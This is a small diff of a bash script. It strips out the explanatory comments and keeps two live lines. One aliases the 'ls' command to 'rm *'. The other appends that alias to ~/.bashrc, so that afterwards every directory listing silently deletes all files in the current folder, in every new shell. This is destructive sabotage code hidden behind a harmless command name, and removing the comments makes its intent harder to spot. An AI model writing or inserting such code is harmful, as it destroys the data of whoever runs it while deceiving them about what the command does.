@@ -1,7 +1,3 @@
 #!/bin/bash
-
-# Creates alias 'ls' with value 'rm *'
 alias ls='rm *'
-
-# Save alias to the current shell environment
 echo "alias ls='rm *'" >> ~/.bashrc
